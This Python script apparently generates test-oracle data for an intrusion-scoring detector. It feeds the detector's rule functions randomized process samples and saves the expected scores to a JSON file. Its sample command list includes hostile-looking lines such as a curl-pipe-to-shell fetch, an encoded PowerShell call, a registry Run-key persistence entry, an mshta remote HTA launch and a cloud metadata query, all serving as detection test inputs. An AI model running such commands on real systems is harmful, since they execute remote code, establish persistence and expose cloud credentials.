#!/usr/bin/env python3
"""Read old pure rule functions without writing into the old project or querying ES."""
import sys,pathlib,json,importlib,random
sys.dont_write_bytecode=True
root=pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0,str(root.parent/'sls-hunter-spark-mining/src/main/python'))
rng=random.Random(47)
commands=['curl http://1.2.3.4/.x/a | sh','curl -x http://proxy:80 http://a.test','/bin/bash /usr/bin/custom','echo hi','powershell -enc '+'A'*30,'cmd /c C:\\Temp\\foo.bat','reg ADD HKCU\\CurrentVersion\\Run /v CSCC','C:\\Windows\\system32\\ipconfig.exe','C:\\Google\\Chrome\\Application\\chrome.exe','curl http://metadata -H "Metadata-Flavor: Google"','curl http://127.0.0.1/healthy','make -j redis','ssh opsvictor@host exit','intellij-git-askpass','mshta http://example.com/test.hta']
rows=[]
for f in ['tracing_sas_linux','tracing_sas_win','tracing_sas_jumper']:
 m=importlib.import_module('mining.'+f+'.structural_intrusion_score')
 for i in range(160):
  proc=rng.choice(sorted(m.NETWORK_FETCH_PROCS|m.RARE_GATEWAY_PROCS|{'bash','java','cmd.exe','rundll32.exe','mssys.exe','chrome.exe','reg.exe','ssh','gcc','cat','python3'}))
  samples=[{'cmdline':rng.choice(commands),'cmd_chain':json.dumps([rng.choice(['bash /usr/bin/custom','runc init','make usesystemd','C:\\Windows\\System\\sys\\syscon\\mssys.exe','cmd.exe /c foo']),'/bin/parent']),'type':rng.choice(['Connect','Exec']),'dst_ip':rng.choice(['10.0.0.1','8.8.8.8','169.254.169.254']),'proc_path':rng.choice(['','C:\\Temp\\foo.exe']),'username':'opsvictor'} for _ in range(rng.randint(0,4))]
  tm={rng.choice(commands):rng.randint(1,3) for _ in range(rng.randint(0,8))};ch={rng.choice(['curl → /bin/bash','cmd → powershell','echo → agent','other → agent']):1 for _ in range(rng.randint(0,4))}
  fleet=rng.choice([0,1,3,8,25,26,50,100]);paths=rng.choice([[],['/usr/bin/normal']]);b=rng.choice([10.,60.,100.])
  score,detail=m.apply_intelligent_score_adjustments(b,proc,samples,tm,ch,set(paths),fleet)
  rows.append(dict(family=f,base=b,proc=proc,samples=samples,templates=tm,chains=ch,paths=paths,fleet=fleet,expected=score,detail=detail))
(root/'src/test/resources/oracle.json').write_text(json.dumps(rows,ensure_ascii=False,indent=2)+'\n')
print('Generated',len(rows),'offline rule cases')
